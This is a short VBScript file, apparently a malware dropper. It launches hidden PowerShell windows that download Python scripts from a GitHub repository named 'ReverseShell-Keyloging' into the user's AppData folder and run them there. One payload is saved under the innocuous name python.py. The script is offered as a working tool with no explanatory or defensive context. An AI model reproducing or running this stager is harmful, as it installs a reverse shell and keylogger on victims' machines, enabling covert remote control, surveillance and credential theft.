Set objShell = CreateObject("WScript.Shell")
'objShell.Run "powershell -NoExit -c ""iwr https://github.com/Caaki/ReverseShell-Keyloging/raw/main/system32.txt -outfile $env:APPDATA\system32.txt""", 0
objShell.Run "powershell -NoExit -c ""iwr https://raw.githubusercontent.com/Caaki/ReverseShell-Keyloging/main/install.py -outfile $env:APPDATA\install.py; python $env:APPDATA\install.py""", 0
objShell.Run "powershell -NoExit -c ""iwr https://raw.githubusercontent.com/Caaki/ReverseShell-Keyloging/main/clientV8.py -outfile $env:APPDATA\python.py; python $env:APPDATA\python.py""", 0
